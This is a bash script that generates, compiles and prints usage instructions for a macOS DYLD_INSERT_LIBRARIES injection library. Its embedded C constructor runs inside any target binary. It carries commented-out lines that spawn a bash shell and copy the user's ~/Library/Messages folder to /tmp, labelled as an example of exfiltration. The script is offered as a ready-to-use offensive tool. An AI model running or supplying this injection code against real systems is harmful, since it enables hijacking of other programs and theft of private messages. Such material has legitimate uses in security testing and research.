#!/bin/bash
# Create a DYLD_INSERT_LIBRARIES injection library

if [ -z "$1" ]; then
    echo "Usage: $0 <target_binary_path> [output_dylib]"
    echo "Example: $0 /path/to/binary inject.dylib"
    exit 1
fi

TARGET_BINARY="$1"
OUTPUT_DYLIB="${2:-inject.dylib}"

# Create temporary directory for source
TMP_DIR=$(mktemp -d)
SOURCE_FILE="$TMP_DIR/inject.c"

cat > "$SOURCE_FILE" << 'EOF'
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    if (argc > 0 && argv[0]) {
        syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
        printf("[+] dylib injected in %s\n", argv[0]);
        
        // Uncomment to spawn shell (use with caution)
        // execv("/bin/bash", 0);
        
        // Example: exfiltrate data
        // system("cp -r ~/Library/Messages/ /tmp/Messages/" );
    }
}
EOF

echo "=== Creating Injection Dylib ==="
echo "Target: $TARGET_BINARY"
echo "Output: $OUTPUT_DYLIB"
echo ""

# Check if target exists
if [ ! -f "$TARGET_BINARY" ]; then
    echo "Error: Target binary not found at $TARGET_BINARY"
    rm -rf "$TMP_DIR"
    exit 1
fi

# Get architecture of target binary
ARCH=$(file "$TARGET_BINARY" | grep -o "Mach-O [^"]*" | head -1)
echo "Target architecture: $ARCH"

# Compile the injection library
echo "Compiling injection library..."
if gcc -dynamiclib -o "$OUTPUT_DYLIB" "$SOURCE_FILE" 2>&1; then
    echo "[+] Successfully created $OUTPUT_DYLIB"
    
    # Show usage
    echo ""
    echo "=== Usage ==="
    echo "To inject into target:"
    echo "  DYLD_INSERT_LIBRARIES=$OUTPUT_DYLIB $TARGET_BINARY"
    echo ""
    echo "Or with absolute path:"
    echo "  DYLD_INSERT_LIBRARIES=$(pwd)/$OUTPUT_DYLIB $TARGET_BINARY"
else
    echo "[!] Failed to compile injection library"
    rm -rf "$TMP_DIR"
    exit 1
fi

# Cleanup
rm -rf "$TMP_DIR"

echo ""
echo "=== Complete ==="
